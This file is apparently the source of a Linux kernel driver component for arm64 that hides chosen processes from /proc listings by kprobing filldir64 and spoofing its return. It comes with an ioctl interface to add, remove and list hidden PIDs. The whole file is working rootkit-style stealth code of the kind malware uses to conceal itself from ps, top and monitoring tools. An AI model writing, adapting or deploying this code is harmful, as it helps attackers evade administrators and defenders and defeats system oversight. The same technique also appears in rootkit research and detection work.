// SPDX-License-Identifier: GPL-2.0-only
// Hide /proc/<pid> entries by kprobing filldir64 and spoofing its return.
// filldir64 signature stayed (ctx, name, namlen, offset, ino, d_type) across 5.10..6.12; only the return type flipped int->bool at 6.5, harmless because we always spoof zero which is false/0.

#include <linux/errno.h>
#include <linux/fs.h>
#include <linux/kernel.h>
#include <linux/kprobes.h>
#include <linux/mutex.h>
#include <linux/printk.h>
#include <linux/ptrace.h>
#include <linux/spinlock.h>
#include <linux/string.h>
#include <linux/types.h>
#include <linux/uaccess.h>

#include <driver/uapi.h>

#include "hide_task.h"
#include "kallsym.h"
#include "log.h"

#define HT_NAME_BUF 12

static pid_t hidden_pids[HIDE_TASK_MAX_SLOTS];
static DEFINE_RAW_SPINLOCK(hidden_lock);
static DEFINE_MUTEX(kp_lock);
static struct kprobe filldir_kp;
static bool kp_registered;

/* Parse a proc-dir name as a positive decimal PID. Rejects empty, leading-zero, non-digit, or overflow. */
static bool parse_pid_name(const char *name, int len, pid_t *out) {
	pid_t v = 0;
	int i;

	if (len <= 0 || len > 10) return false;
	if (len > 1 && name[0] == '0') return false;
	for (i = 0; i < len; i++) {
		unsigned int c = (unsigned char)name[i];
		if (c < '0' || c > '9') return false;
		v = v * 10 + (int)(c - '0');
		if (v < 0) return false;
	}
	*out = v;
	return true;
}

/* Reader hot path. Called from kprobe pre_handler with IRQs already disabled. */
bool hide_task_contains(pid_t pid) {
	unsigned long flags;
	bool hit = false;
	int i;

	if (pid <= 0) return false;
	raw_spin_lock_irqsave(&hidden_lock, flags);
	for (i = 0; i < HIDE_TASK_MAX_SLOTS; i++) {
		if (hidden_pids[i] == pid) { hit = true; break; }
	}
	raw_spin_unlock_irqrestore(&hidden_lock, flags);
	return hit;
}

/* filldir64(ctx, name, namlen, offset, ino, d_type) — x0..x5 on arm64. */
static int filldir64_pre(struct kprobe *p, struct pt_regs *regs) {
	const char *name;
	int namlen;
	unsigned int d_type;
	pid_t candidate;

	(void)p;
	if (!regs) return 0;

	d_type = (unsigned int)regs->regs[5];
	if (d_type != DT_DIR) return 0;

	name = (const char *)regs->regs[1];
	namlen = (int)regs->regs[2];
	if (!name || namlen <= 0) return 0;

	if (!parse_pid_name(name, namlen, &candidate)) return 0;
	if (!hide_task_contains(candidate)) return 0;

	/* Spoof: skip original, return 0/false (continue iteration without adding this entry). */
	regs->regs[0] = 0;
	instruction_pointer_set(regs, procedure_link_pointer(regs));
	return 1;
}

static int hide_task_register_kprobe_locked(void) {
	unsigned long addr;
	int rc;

	if (kp_registered) return 0;

	addr = kallsym_lookup("filldir64");
	if (!addr) {
		LOGE("hide_task: filldir64 not in kallsyms\n");
		return -ENOENT;
	}

	memset(&filldir_kp, 0, sizeof(filldir_kp));
	filldir_kp.addr = (kprobe_opcode_t *)addr;
	filldir_kp.pre_handler = filldir64_pre;

	rc = register_kprobe(&filldir_kp);
	if (rc) {
		LOGE("hide_task: register_kprobe(filldir64) failed: %d\n", rc);
		return rc;
	}
	kp_registered = true;
	LOGI("hide_task: filldir64 kprobe armed at %px\n", (void *)addr);
	return 0;
}

int hide_task_init(void) {
	return 0;
}

int hide_task_add(pid_t pid) {
	unsigned long flags;
	int free_slot = -1;
	int i, rc;

	if (pid <= 0) return -EINVAL;

	mutex_lock(&kp_lock);
	rc = hide_task_register_kprobe_locked();
	mutex_unlock(&kp_lock);
	if (rc) return rc;

	raw_spin_lock_irqsave(&hidden_lock, flags);
	for (i = 0; i < HIDE_TASK_MAX_SLOTS; i++) {
		if (hidden_pids[i] == pid) { raw_spin_unlock_irqrestore(&hidden_lock, flags); return 0; }
		if (hidden_pids[i] == 0 && free_slot < 0) free_slot = i;
	}
	if (free_slot < 0) { raw_spin_unlock_irqrestore(&hidden_lock, flags); return -ENOSPC; }
	hidden_pids[free_slot] = pid;
	raw_spin_unlock_irqrestore(&hidden_lock, flags);
	LOGI("hide_task: add pid=%d slot=%d\n", pid, free_slot);
	return 0;
}

int hide_task_remove(pid_t pid) {
	unsigned long flags;
	int i;

	if (pid <= 0) return -EINVAL;
	raw_spin_lock_irqsave(&hidden_lock, flags);
	for (i = 0; i < HIDE_TASK_MAX_SLOTS; i++) {
		if (hidden_pids[i] == pid) {
			hidden_pids[i] = 0;
			raw_spin_unlock_irqrestore(&hidden_lock, flags);
			LOGI("hide_task: remove pid=%d\n", pid);
			return 0;
		}
	}
	raw_spin_unlock_irqrestore(&hidden_lock, flags);
	return -ENOENT;
}

void hide_task_clear(void) {
	unsigned long flags;

	raw_spin_lock_irqsave(&hidden_lock, flags);
	memset(hidden_pids, 0, sizeof(hidden_pids));
	raw_spin_unlock_irqrestore(&hidden_lock, flags);
	LOGI("hide_task: cleared\n");
}

int hide_task_list(pid_t *out, size_t max) {
	unsigned long flags;
	int i, n = 0;

	if (!out || max == 0) return -EINVAL;
	raw_spin_lock_irqsave(&hidden_lock, flags);
	for (i = 0; i < HIDE_TASK_MAX_SLOTS && (size_t)n < max; i++) {
		if (hidden_pids[i] != 0) out[n++] = hidden_pids[i];
	}
	raw_spin_unlock_irqrestore(&hidden_lock, flags);
	return n;
}

long do_hide_task_cmd(unsigned int cmd, void __user *arg) {
	struct drv_ioctl_req req;
	pid_t list[HIDE_TASK_MAX_SLOTS];
	int n;

	if (copy_from_user(&req, arg, sizeof(req)) != 0) return -EFAULT;

	switch (cmd) {
		case DRV_CMD_HIDE_PID_ADD:
			return hide_task_add((pid_t)req.pid);
		case DRV_CMD_HIDE_PID_REMOVE:
			return hide_task_remove((pid_t)req.pid);
		case DRV_CMD_HIDE_PID_CLEAR:
			hide_task_clear();
			return 0;
		case DRV_CMD_HIDE_PID_LIST:
			n = hide_task_list(list, HIDE_TASK_MAX_SLOTS);
			if (n < 0) return n;
			if (req.size < (u64)(n * sizeof(pid_t))) return -EMSGSIZE;
			if (copy_to_user((void __user *)(uintptr_t)req.buf, list, n * sizeof(pid_t)) != 0) return -EFAULT;
			req.size = (u64)n;
			if (copy_to_user(arg, &req, sizeof(req)) != 0) return -EFAULT;
			return 0;
		default:
			return -ENOTTY;
	}
}
